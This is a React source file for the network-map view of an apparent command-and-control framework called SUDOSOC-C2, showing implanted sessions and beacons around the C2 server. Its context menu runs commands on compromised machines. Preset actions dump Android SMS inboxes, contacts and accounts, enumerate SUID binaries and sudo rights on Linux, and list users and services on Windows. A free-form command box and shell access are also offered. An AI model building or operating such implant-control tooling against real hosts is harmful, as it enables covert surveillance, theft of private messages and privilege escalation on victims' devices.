import { useEffect, useRef, useState, useCallback } from 'react'
import { useAPI, apiPost, apiFetch, apiDelete } from '../hooks/useAPI'
import type { Session, Beacon, Listener } from '../types'
import {
  Map as MapIcon, RefreshCw, ZoomIn, ZoomOut, Maximize2,
  Loader, Terminal, Send, Skull, FolderOpen, Download,
  X, ChevronRight, Info,
} from 'lucide-react'

// ─── Node model ───────────────────────────────────────────────────────────────

interface Node {
  id:        string
  label:     string
  sublabel?: string
  type:      'c2' | 'session' | 'beacon' | 'listener'
  os?:       string
  x:         number
  y:         number
}
interface Link { from: string; to: string; label?: string; dashed?: boolean }
interface CtxState {
  node:       Node
  sessionId?: string
  beaconId?:  string
  isAndroid:  boolean
  x: number; y: number
}

// ─── Styling ──────────────────────────────────────────────────────────────────

const COLORS = {
  c2:       { fill: '#00ff8822', stroke: '#00ff88', text: '#00ff88' },
  session:  { fill: '#00d4ff22', stroke: '#00d4ff', text: '#00d4ff' },
  beacon:   { fill: '#ffaa0022', stroke: '#ffaa00', text: '#ffaa00' },
  listener: { fill: '#aa88ff22', stroke: '#aa88ff', text: '#aa88ff' },
}
const RADIUS = { c2: 32, session: 22, beacon: 20, listener: 16 }

const OS_ICON: Record<string, string> = {
  windows: '🪟', linux: '🐧', macos: '🍎', darwin: '🍎',
  android: '🤖', freebsd: '👿',
}

function osIcon(os?: string) {
  if (!os) return '💻'
  const o = os.toLowerCase()
  for (const [k, v] of Object.entries(OS_ICON)) {
    if (o.includes(k)) return v
  }
  return '💻'
}

function checkinAgo(ts: number) {
  const s = Math.floor(Date.now() / 1000 - (ts > 1e10 ? ts / 1000 : ts))
  if (s < 60)   return { t: `${s}s`,            c: '#00ff88' }
  if (s < 300)  return { t: `${Math.floor(s/60)}m`, c: '#ffaa00' }
  return          { t: `${Math.floor(s/60)}m`,  c: '#ff4444' }
}

// ─── Android quick actions ────────────────────────────────────────────────────

const ANDROID_CTX = [
  { icon:'📱', label:'Device Info',  cmd:'getprop ro.product.model && getprop ro.build.version.release && id' },
  { icon:'💬', label:'SMS Inbox',    cmd:"content query --uri content://sms/inbox --projection address:body:date 2>/dev/null | head -60" },
  { icon:'👥', label:'Contacts',     cmd:"content query --uri content://contacts/phones/ --projection display_name:number 2>/dev/null | head -60" },
  { icon:'📂', label:'SD Card',      cmd:'ls -la /sdcard/' },
  { icon:'📦', label:'Apps',         cmd:'pm list packages -3 2>/dev/null' },
  { icon:'📶', label:'WiFi',         cmd:"dumpsys wifi 2>/dev/null | grep -E 'SSID|IP address' | head -15 || ip addr" },
  { icon:'🔋', label:'Battery',      cmd:'dumpsys battery 2>/dev/null | head -12' },
  { icon:'🔑', label:'Accounts',     cmd:"dumpsys account 2>/dev/null | grep 'Account {' | head -20" },
]
const UNIX_CTX = [
  { icon:'👤', label:'id',         cmd:'id' },
  { icon:'🖥️', label:'uname',      cmd:'uname -a' },
  { icon:'🌐', label:'ip addr',    cmd:'ip addr show' },
  { icon:'🔌', label:'ports',      cmd:'ss -tulpn 2>/dev/null || netstat -tulpn' },
  { icon:'📋', label:'ps',         cmd:'ps aux | head -25' },
  { icon:'🔑', label:'sudo -l',   cmd:'sudo -l 2>&1' },
  { icon:'💾', label:'df',         cmd:'df -h' },
  { icon:'🔒', label:'suid',       cmd:'find / -perm -4000 2>/dev/null | head -15' },
]
const WIN_CTX = [
  { icon:'👤', label:'whoami',     cmd:'cmd.exe /c whoami /all' },
  { icon:'🌐', label:'ipconfig',   cmd:'cmd.exe /c ipconfig /all' },
  { icon:'📋', label:'tasklist',   cmd:'cmd.exe /c tasklist' },
  { icon:'🔌', label:'netstat',    cmd:'cmd.exe /c netstat -ano' },
  { icon:'👥', label:'net user',   cmd:'cmd.exe /c net user' },
  { icon:'💻', label:'systeminfo', cmd:'cmd.exe /c systeminfo' },
  { icon:'📂', label:'dir C:\\',   cmd:'cmd.exe /c dir C:\\' },
  { icon:'⚙️', label:'services',  cmd:'cmd.exe /c sc query type= all state= running' },
]

// ─── Component ────────────────────────────────────────────────────────────────

interface Props { onOpenTerminal: (id: string, name: string) => void }

export default function NetworkMap({ onOpenTerminal }: Props) {
  const { data: sessions,  refresh: rS } = useAPI<Session[]>('/api/sessions',   8_000)
  const { data: beacons,   refresh: rB } = useAPI<Beacon[]>('/api/beacons',     10_000)
  const { data: listeners, refresh: rL } = useAPI<Listener[]>('/api/listeners', 10_000)

  const svgRef = useRef<SVGSVGElement>(null)
  const [dims,   setDims]   = useState({ w: 800, h: 500 })
  const [scale,  setScale]  = useState(1)
  const [offset, setOffset] = useState({ x: 0, y: 0 })
  const [drag,   setDrag]   = useState<{ sx: number; sy: number; ox: number; oy: number } | null>(null)

  // Context menu
  const [ctx,        setCtx]        = useState<CtxState | null>(null)
  const [ctxOut,     setCtxOut]     = useState<string | null>(null)
  const [ctxLoading, setCtxLoading] = useState(false)
  const [ctxCmd,     setCtxCmd]     = useState('')

  // Hover tooltip
  const [hover, setHover] = useState<{ node: Node; x: number; y: number } | null>(null)

  // Resize observer
  useEffect(() => {
    if (!svgRef.current) return
    const ro = new ResizeObserver(es => {
      const { width, height } = es[0].contentRect
      setDims({ w: width, h: height })
    })
    ro.observe(svgRef.current.parentElement!)
    return () => ro.disconnect()
  }, [])

  function refresh() { rS(); rB(); rL() }

  // ── Build graph ───────────────────────────────────────────────────────────
  const { w, h } = dims
  const cx = w / 2, cy = h / 2

  const nodes: Node[] = []
  const links: Link[] = []

  // C2 center
  nodes.push({ id: 'c2', label: 'SUDOSOC-C2', sublabel: 'C2 Server', type: 'c2', x: cx, y: cy })

  // Listeners — top arc
  const lstList = listeners ?? []
  lstList.forEach((l, i) => {
    const angle = ((i / Math.max(lstList.length, 1)) - 0.5) * Math.PI * 1.2
    const r = Math.min(w, h) * 0.22
    const node: Node = {
      id:       `lst-${l.id}`,
      label:    l.protocol?.toUpperCase() ?? '?',
      sublabel: `:${l.port}`,
      type:     'listener',
      x: cx + r * Math.sin(angle),
      y: cy - r * Math.abs(Math.cos(angle)) * 0.7 - r * 0.3,
    }
    nodes.push(node)
    links.push({ from: 'c2', to: node.id, label: l.domains?.[0] })
  })

  // Sessions — spread around C2
  const sessList = sessions ?? []
  sessList.forEach((s, i) => {
    const total = sessList.length
    const angle = (i / Math.max(total, 1)) * 2 * Math.PI - Math.PI / 2
    const r = Math.min(w, h) * 0.33
    const spread = total <= 3 ? 0 : (Math.random() - 0.5) * 20
    const node: Node = {
      id:       `ses-${s.id}`,
      label:    s.name,
      sublabel: `${s.username}@${s.hostname}`,
      type:     'session',
      os:       s.os?.toLowerCase(),
      x: cx + r * Math.cos(angle) + spread,
      y: cy + r * Math.sin(angle) + spread,
    }
    nodes.push(node)
    links.push({ from: 'c2', to: node.id, label: s.transport })
  })

  // Beacons — outer ring
  const bcnList = beacons ?? []
  bcnList.forEach((b, i) => {
    const angle = (i / Math.max(bcnList.length, 1)) * 2 * Math.PI + Math.PI / 4
    const r = Math.min(w, h) * 0.44
    const node: Node = {
      id:       `bea-${b.id}`,
      label:    b.name,
      sublabel: `${b.username}@${b.hostname}`,
      type:     'beacon',
      os:       b.os?.toLowerCase(),
      x: cx + r * Math.cos(angle),
      y: cy + r * Math.sin(angle),
    }
    nodes.push(node)
    links.push({ from: 'c2', to: node.id, dashed: true })
  })

  const nodeMap = new Map(nodes.map(n => [n.id, n]))
  const totalTargets = sessList.length + bcnList.length

  // ── Context menu execute ──────────────────────────────────────────────────
  const ctxExec = useCallback(async (cmd: string) => {
    if (!ctx?.sessionId) return
    setCtxLoading(true); setCtxOut(null)
    try {
      const res = await apiPost<{ stdout: string; stderr: string; exit_code: number }>(
        `/api/sessions/${ctx.sessionId}/execute`, { command: cmd }
      )
      const out = (res.stdout || res.stderr || '(no output)').slice(0, 2500)
      setCtxOut(out)
    } catch(e) { setCtxOut(`Error: ${String(e)}`) }
    finally { setCtxLoading(false) }
  }, [ctx])

  async function ctxKill() {
    if (!ctx?.sessionId || !confirm(`Kill ${ctx.node.label}?`)) return
    try { await apiDelete(`/api/sessions/${ctx.sessionId}/kill`) } catch {}
    setCtx(null); refresh()
  }

  // ── Mouse / touch ──────────────────────────────────────────────────────────
  function onSvgDown(e: React.MouseEvent) {
    const el = e.target as SVGElement
    if (el.closest('[data-node]')) return
    setDrag({ sx: e.clientX, sy: e.clientY, ox: offset.x, oy: offset.y })
    setHover(null)
  }
  function onSvgMove(e: React.MouseEvent) {
    if (!drag) return
    setOffset({ x: drag.ox + (e.clientX - drag.sx), y: drag.oy + (e.clientY - drag.sy) })
  }
  function onSvgUp() { setDrag(null) }

  function onNodeClick(node: Node, e: React.MouseEvent) {
    e.stopPropagation()
    setHover(prev => prev?.node.id === node.id ? null : { node, x: e.clientX, y: e.clientY })
    setCtx(null)
  }
  function onNodeRightClick(node: Node, e: React.MouseEvent) {
    e.preventDefault(); e.stopPropagation()
    setHover(null)
    const sessionId = node.id.startsWith('ses-') ? node.id.slice(4) : undefined
    const beaconId  = node.id.startsWith('bea-') ? node.id.slice(4) : undefined
    setCtx({
      node, sessionId, beaconId,
      isAndroid: !!(node.os?.includes('android')),
      x: e.clientX, y: e.clientY,
    })
    setCtxOut(null); setCtxCmd('')
  }
  function onCanvasClick() { setHover(null); setCtx(null) }
  function onWheel(e: React.WheelEvent) {
    e.preventDefault()
    setScale(s => Math.max(0.25, Math.min(2.5, s - e.deltaY * 0.001)))
  }

  const ctxActions = ctx?.isAndroid ? ANDROID_CTX
    : ctx?.node.os?.includes('windows') ? WIN_CTX
    : UNIX_CTX

  return (
    <div className="flex flex-col gap-3 h-full">

      {/* ── Header ─────────────────────────────────────────────────────── */}
      <div className="flex items-center justify-between shrink-0">
        <div>
          <h2 className="text-primary font-bold text-lg flex items-center gap-2">
            <MapIcon size={18} /> Network Map
          </h2>
          <p className="text-muted text-xs mt-0.5">
            {sessList.length} sessions · {bcnList.length} beacons · {lstList.length} listeners
            <span className="text-muted/60 ml-2">· Right-click for actions · Scroll to zoom</span>
          </p>
        </div>
        <div className="flex items-center gap-1.5">
          <button onClick={() => setScale(s => Math.min(s + 0.25, 2.5))}
            className="p-1.5 rounded border border-border text-muted hover:text-text"><ZoomIn size={13} /></button>
          <button onClick={() => setScale(s => Math.max(s - 0.25, 0.25))}
            className="p-1.5 rounded border border-border text-muted hover:text-text"><ZoomOut size={13} /></button>
          <button onClick={() => { setScale(1); setOffset({ x: 0, y: 0 }) }}
            className="p-1.5 rounded border border-border text-muted hover:text-text"><Maximize2 size={13} /></button>
          <button onClick={refresh}
            className="flex items-center gap-1 text-muted hover:text-text text-[11px] px-2 py-1 rounded border border-border">
            <RefreshCw size={11} /> Refresh
          </button>
        </div>
      </div>

      {/* ── Legend ─────────────────────────────────────────────────────── */}
      <div className="flex items-center gap-4 text-[10px] shrink-0">
        {(Object.entries(COLORS) as [keyof typeof COLORS, typeof COLORS.c2][]).map(([type, c]) => (
          <div key={type} className="flex items-center gap-1.5">
            <div className="w-2.5 h-2.5 rounded-full border" style={{ background: c.fill, borderColor: c.stroke }} />
            <span style={{ color: c.text }} className="capitalize">{type}</span>
          </div>
        ))}
      </div>

      {/* ── Canvas ─────────────────────────────────────────────────────── */}
      <div className="flex-1 min-h-0 relative rounded-xl border border-border bg-[#040410] overflow-hidden"
        style={{ cursor: drag ? 'grabbing' : 'grab' }}
        onClick={onCanvasClick}
        onContextMenu={e => e.preventDefault()}>

        <svg ref={svgRef} className="w-full h-full select-none"
          onMouseDown={onSvgDown} onMouseMove={onSvgMove}
          onMouseUp={onSvgUp} onMouseLeave={onSvgUp}
          onWheel={onWheel}>

          <defs>
            {/* Glow filter */}
            {(Object.entries(COLORS) as [string, typeof COLORS.c2][]).map(([type, c]) => (
              <filter key={type} id={`glow-${type}`}>
                <feGaussianBlur stdDeviation="3" result="blur" />
                <feFlood floodColor={c.stroke} floodOpacity="0.6" result="color" />
                <feComposite in="color" in2="blur" operator="in" result="glow" />
                <feMerge><feMergeNode in="glow" /><feMergeNode in="SourceGraphic" /></feMerge>
              </filter>
            ))}
            {/* Arrow markers */}
            {(Object.entries(COLORS) as [string, typeof COLORS.c2][]).map(([type, c]) => (
              <marker key={type} id={`arr-${type}`} markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
                <path d="M0,0 L0,6 L8,3 z" fill={c.stroke} opacity="0.6" />
              </marker>
            ))}
            {/* Grid pattern */}
            <pattern id="grid" width="40" height="40" patternUnits="userSpaceOnUse">
              <path d="M 40 0 L 0 0 0 40" fill="none" stroke="#ffffff08" strokeWidth="0.5" />
            </pattern>
          </defs>

          {/* Grid background */}
          <rect width="100%" height="100%" fill="url(#grid)" />

          <g transform={`translate(${offset.x},${offset.y}) scale(${scale})`}>

            {/* ── Links ────────────────────────────────────────────── */}
            {links.map((lk, i) => {
              const from = nodeMap.get(lk.from)
              const to   = nodeMap.get(lk.to)
              if (!from || !to) return null
              const c = COLORS[to.type]
              const mx = (from.x + to.x) / 2
              const my = (from.y + to.y) / 2
              const dx = to.x - from.x, dy = to.y - from.y
              const len = Math.sqrt(dx*dx + dy*dy)
              const nx = -dy / len * 18, ny = dx / len * 18
              return (
                <g key={i}>
                  <path
                    d={`M${from.x},${from.y} Q${mx + nx},${my + ny} ${to.x},${to.y}`}
                    fill="none"
                    stroke={c.stroke}
                    strokeWidth={lk.dashed ? 1 : 1.5}
                    strokeOpacity="0.4"
                    strokeDasharray={lk.dashed ? '5 4' : undefined}
                    markerEnd={`url(#arr-${to.type})`}
                  />
                  {lk.label && (
                    <text x={mx + nx * 0.7} y={my + ny * 0.7} textAnchor="middle"
                      fontSize="9" fill={c.stroke} opacity="0.6" fontFamily="monospace">
                      {lk.label}
                    </text>
                  )}
                </g>
              )
            })}

            {/* ── Nodes ────────────────────────────────────────────── */}
            {nodes.map(node => {
              const r    = RADIUS[node.type]
              const c    = COLORS[node.type]
              const icon = node.os ? osIcon(node.os) : node.type === 'c2' ? '🖥️' : '📡'
              const isHov  = hover?.node.id === node.id
              const isCtx  = ctx?.node.id === node.id

              // Check-in age for sessions/beacons
              let checkin: { t: string; c: string } | null = null
              if (node.type === 'session') {
                const s = sessList.find(x => `ses-${x.id}` === node.id)
                if (s) checkin = checkinAgo(s.last_checkin)
              }
              if (node.type === 'beacon') {
                const b = bcnList.find(x => `bea-${x.id}` === node.id)
                if (b) checkin = checkinAgo(b.last_checkin)
              }

              return (
                <g key={node.id} data-node="1"
                  onClick={e => onNodeClick(node, e)}
                  onContextMenu={e => onNodeRightClick(node, e)}
                  style={{ cursor: 'pointer' }}>

                  {/* Pulse ring for selected */}
                  {(isHov || isCtx) && (
                    <circle cx={node.x} cy={node.y} r={r + 9}
                      fill="none" stroke={c.stroke} strokeWidth="1.5" opacity="0.4" />
                  )}

                  {/* C2 outer glow rings */}
                  {node.type === 'c2' && <>
                    <circle cx={node.x} cy={node.y} r={r + 18} fill="none" stroke="#00ff88" strokeWidth="0.5" opacity="0.15" />
                    <circle cx={node.x} cy={node.y} r={r + 30} fill="none" stroke="#00ff88" strokeWidth="0.3" opacity="0.08" />
                  </>}

                  {/* Node circle */}
                  <circle cx={node.x} cy={node.y} r={r}
                    fill={isHov || isCtx ? c.stroke + '44' : c.fill}
                    stroke={c.stroke}
                    strokeWidth={node.type === 'c2' ? 2 : isHov || isCtx ? 2 : 1.5}
                    filter={node.type === 'c2' ? `url(#glow-c2)` : isHov ? `url(#glow-${node.type})` : undefined}
                  />

                  {/* OS / type icon */}
                  <text x={node.x} y={node.y + 1} textAnchor="middle" dominantBaseline="middle"
                    fontSize={r * 0.82}>{icon}</text>

                  {/* Name label below */}
                  <text x={node.x} y={node.y + r + 13} textAnchor="middle"
                    fontSize="10" fill={c.text} fontWeight="600" fontFamily="monospace">
                    {node.label.length > 13 ? node.label.slice(0, 11) + '…' : node.label}
                  </text>

                  {/* Sub-label */}
                  {node.sublabel && (
                    <text x={node.x} y={node.y + r + 24} textAnchor="middle"
                      fontSize="8" fill="#666688" fontFamily="monospace">
                      {node.sublabel.length > 16 ? node.sublabel.slice(0, 14) + '…' : node.sublabel}
                    </text>
                  )}

                  {/* Check-in indicator dot */}
                  {checkin && (
                    <g>
                      <circle cx={node.x + r * 0.68} cy={node.y - r * 0.68} r="5"
                        fill="#0a0a1a" stroke={checkin.c} strokeWidth="1.5" />
                      <circle cx={node.x + r * 0.68} cy={node.y - r * 0.68} r="2.5"
                        fill={checkin.c} />
                    </g>
                  )}

                  {/* Listener port badge */}
                  {node.type === 'listener' && node.sublabel && (
                    <text x={node.x} y={node.y - r - 7} textAnchor="middle"
                      fontSize="8" fill={c.stroke} fontFamily="monospace" fontWeight="bold">
                      {node.sublabel}
                    </text>
                  )}
                </g>
              )
            })}
          </g>
        </svg>

        {/* Empty state */}
        {totalTargets === 0 && (
          <div className="absolute inset-0 flex flex-col items-center justify-center gap-2 pointer-events-none">
            <MapIcon size={36} className="text-border" />
            <p className="text-muted text-sm">No agents connected</p>
            <p className="text-muted text-xs">Start a listener and deploy an implant</p>
          </div>
        )}

        {/* ── Hover tooltip ─────────────────────────────────────────── */}
        {hover && !ctx && (() => {
          const { node, x, y } = hover
          const s = node.type === 'session' ? sessList.find(x => `ses-${x.id}` === node.id) : null
          const b = node.type === 'beacon'  ? bcnList.find(x => `bea-${x.id}` === node.id) : null
          const l = node.type === 'listener'? lstList.find(x => `lst-${x.id}` === node.id) : null
          const checkin = s ? checkinAgo(s.last_checkin) : b ? checkinAgo(b.last_checkin) : null
          const pw = 200
          const ph = 120
          const tx = Math.min(Math.max(x + 12, 8), window.innerWidth - pw - 8)
          const ty = Math.min(Math.max(y + 12, 8), window.innerHeight - ph - 8)
          const c  = COLORS[node.type]
          return (
            <div className="absolute z-20 rounded-xl border shadow-2xl overflow-hidden pointer-events-none"
              style={{ left: tx, top: ty, width: pw, borderColor: c.stroke + '50', background: '#0a0a18' }}>
              <div className="px-3 py-2 border-b" style={{ borderColor: c.stroke + '30' }}>
                <span className="font-bold text-xs" style={{ color: c.stroke }}>
                  {osIcon(node.os)} {node.label}
                </span>
                <span className="text-muted text-[9px] ml-2 uppercase">{node.type}</span>
              </div>
              <div className="px-3 py-2 flex flex-col gap-1 text-[10px]">
                {node.sublabel && <div className="text-muted">{node.sublabel}</div>}
                {(s || b) && <div className="text-muted">Transport: <span className="text-text">{s?.transport ?? b?.transport}</span></div>}
                {(s || b) && <div className="text-muted">Address: <span className="text-text">{s?.remote_address ?? b?.remote_address}</span></div>}
                {checkin && <div className="text-muted">Check-in: <span style={{ color: checkin.c }} className="font-semibold">{checkin.t} ago</span></div>}
                {l && <div className="text-muted">Port: <span className="text-text">{l.port}</span></div>}
                {l?.domains && l.domains.length > 0 && <div className="text-muted">Domains: <span className="text-text">{l.domains.join(', ')}</span></div>}
                <div className="text-[#ff4444]/70 text-[9px] mt-0.5">Right-click for actions</div>
              </div>
            </div>
          )
        })()}

        {/* ── Right-click context menu ────────────────────────────── */}
        {ctx && (() => {
          const menuW = 280
          const menuX = Math.min(ctx.x, window.innerWidth  - menuW - 8)
          const menuY = Math.min(ctx.y, window.innerHeight - 520 - 8)
          const c     = COLORS[ctx.node.type]
          return (
            <div className="absolute z-30 rounded-xl border shadow-2xl overflow-hidden"
              style={{ left: menuX, top: menuY, width: menuW, background: '#0a0a18', borderColor: '#ff444440' }}
              onClick={e => e.stopPropagation()}
              onContextMenu={e => e.preventDefault()}>

              {/* Header */}
              <div className="flex items-center justify-between px-3 py-2 border-b"
                style={{ borderColor: c.stroke + '30', background: '#ffffff05' }}>
                <div className="flex items-center gap-2">
                  <span className="text-lg">{osIcon(ctx.node.os)}</span>
                  <div>
                    <div className="font-bold text-xs" style={{ color: c.stroke }}>{ctx.node.label}</div>
                    <div className="text-[9px] text-muted">{ctx.node.sublabel} · {ctx.node.type}</div>
                  </div>
                </div>
                <button onClick={() => setCtx(null)} className="text-muted hover:text-text"><X size={12} /></button>
              </div>

              <div className="overflow-y-auto" style={{ maxHeight: 480 }}>

                {/* Primary actions for sessions */}
                {ctx.sessionId && (
                  <>
                    <div className="flex gap-1.5 p-2 border-b" style={{ borderColor: '#ffffff10' }}>
                      <button onClick={() => { onOpenTerminal(ctx.sessionId!, ctx.node.label); setCtx(null) }}
                        className="flex-1 flex items-center justify-center gap-1 py-1.5 rounded border border-primary/40 text-primary hover:bg-primary/10 text-[11px] transition-colors">
                        <Terminal size={11} /> Shell
                      </button>
                      <button onClick={() => ctxExec(ctx.isAndroid ? 'ls /sdcard' : 'ls -la')}
                        className="flex-1 flex items-center justify-center gap-1 py-1.5 rounded border border-warn/40 text-warn hover:bg-warn/10 text-[11px] transition-colors">
                        <FolderOpen size={11} /> Files
                      </button>
                      <button onClick={ctxKill}
                        className="flex-1 flex items-center justify-center gap-1 py-1.5 rounded border border-danger/40 text-danger hover:bg-danger/10 text-[11px] transition-colors">
                        <Skull size={11} /> Kill
                      </button>
                    </div>

                    {/* Custom exec */}
                    <div className="p-2 border-b" style={{ borderColor: '#ffffff10' }}>
                      <div className="flex gap-1">
                        <input value={ctxCmd} onChange={e => setCtxCmd(e.target.value)}
                          onKeyDown={e => e.key === 'Enter' && ctxCmd.trim() && ctxExec(ctxCmd)}
                          placeholder="Execute command…"
                          className="flex-1 bg-black/40 border border-border/50 rounded px-2 py-1.5 text-[11px] font-mono text-text placeholder-muted focus:border-primary/50 outline-none" />
                        <button onClick={() => ctxCmd.trim() && ctxExec(ctxCmd)}
                          disabled={ctxLoading || !ctxCmd.trim()}
                          className="px-2 rounded border border-primary/40 text-primary hover:bg-primary/10 disabled:opacity-40">
                          {ctxLoading ? <Loader size={11} className="animate-spin" /> : <Send size={11} />}
                        </button>
                      </div>
                    </div>

                    {/* Quick actions grid */}
                    <div className="p-2 border-b" style={{ borderColor: '#ffffff10' }}>
                      <div className="text-[9px] text-muted uppercase tracking-widest mb-1.5">
                        {ctx.isAndroid ? '🤖 Android' : ctx.node.os?.includes('win') ? '🪟 Windows' : '🐧 Linux'} Quick Actions
                      </div>
                      <div className="grid grid-cols-2 gap-1">
                        {ctxActions.map(a => (
                          <button key={a.label} onClick={() => ctxExec(a.cmd)} disabled={ctxLoading}
                            className="flex items-center gap-1.5 px-2 py-1.5 rounded text-[10px] bg-white/3 border border-white/5 text-text hover:border-primary/40 hover:bg-primary/5 transition-colors disabled:opacity-40 text-left">
                            <span>{a.icon}</span><span className="truncate">{a.label}</span>
                          </button>
                        ))}
                      </div>
                    </div>

                    {/* Output */}
                    {(ctxOut !== null || ctxLoading) && (
                      <div className="p-2">
                        <div className="text-[9px] text-muted uppercase tracking-widest mb-1">Output</div>
                        {ctxLoading
                          ? <div className="flex items-center gap-1.5 text-muted text-[11px]"><Loader size={11} className="animate-spin" />Running…</div>
                          : <pre className="text-[10px] font-mono text-text bg-black/40 rounded p-2 overflow-auto whitespace-pre-wrap break-all" style={{ maxHeight: 160 }}>{ctxOut}</pre>
                        }
                      </div>
                    )}
                  </>
                )}

                {/* Beacon info */}
                {ctx.beaconId && !ctx.sessionId && (
                  <div className="p-3 text-xs text-muted">
                    <div className="font-semibold text-warn mb-1">📡 Beacon</div>
                    <p>Beacons work asynchronously. Use the <span className="text-warn font-semibold">Beacons</span> tab to queue tasks and view results.</p>
                  </div>
                )}

                {/* Listener info */}
                {!ctx.sessionId && !ctx.beaconId && ctx.node.type === 'listener' && (
                  <div className="p-3 text-xs">
                    <div className="font-semibold text-[#aa88ff] mb-1">📡 Listener</div>
                    <div className="text-muted">Protocol: <span className="text-text">{ctx.node.label}</span></div>
                    <div className="text-muted">Port: <span className="text-text">{ctx.node.sublabel}</span></div>
                  </div>
                )}

                {/* C2 info */}
                {ctx.node.type === 'c2' && (
                  <div className="p-3 text-xs text-muted">
                    <div className="font-semibold text-primary mb-1">🖥️ SUDOSOC-C2 Server</div>
                    <p>This is your C2 server. Connected agents appear in the graph around it.</p>
                  </div>
                )}
              </div>
            </div>
          )
        })()}
      </div>

      {/* ── Stats bar ──────────────────────────────────────────────────── */}
      <div className="flex items-center gap-4 text-[10px] text-muted shrink-0 border-t border-border/40 pt-2">
        <span>Sessions: <span className="text-[#00d4ff] font-semibold">{sessList.length}</span></span>
        <span>Beacons: <span className="text-[#ffaa00] font-semibold">{bcnList.length}</span></span>
        <span>Listeners: <span className="text-[#aa88ff] font-semibold">{lstList.length}</span></span>
        <span className="ml-auto">Scale: <span className="text-text">{Math.round(scale * 100)}%</span></span>
      </div>
    </div>
  )
}
